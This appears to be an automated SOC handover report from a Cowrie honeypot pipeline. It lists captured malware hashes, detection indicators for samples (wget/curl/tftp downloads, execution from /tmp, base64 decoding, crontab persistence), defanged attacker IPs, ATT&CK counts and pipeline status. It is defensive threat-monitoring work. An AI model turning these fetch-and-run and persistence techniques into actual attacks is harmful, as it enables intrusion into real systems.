| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `182.252.140[.]114` | CN | abcle | **100** ⚠️ | 50 |
| `41.220.3[.]101` | UG | DATANET.COM LLC | **100** ⚠️ | 50 |
| `117.158.166[.]73` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 6 |
| `142.93.218[.]50` | IN | DigitalOcean, LLC | **100** ⚠️ | 47 |
| `45.79.207[.]111` | US | Linode | **100** ⚠️ | 50 |
| `61.84.4[.]230` | KR | Korea Telecom | **100** ⚠️ | 38 |
| `111.171.125[.]94` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `117.247.77[.]115` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 10 |
| `167.99.243[.]59` | DE | DigitalOcean, LLC | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 360 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 355 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 10 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 9 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 9 |

---

## 🔕 False Positive Summary (28 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 20 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 438 cases |
| Tool 34  | Credential Extractor        | ✅ 371 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 77 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 28 filtered (6.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 50 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 19 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 354 priority case(s) shown individually · 26 recon entry/entries in table (9 group(s) consolidating 39 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-20T22:33:19Z_
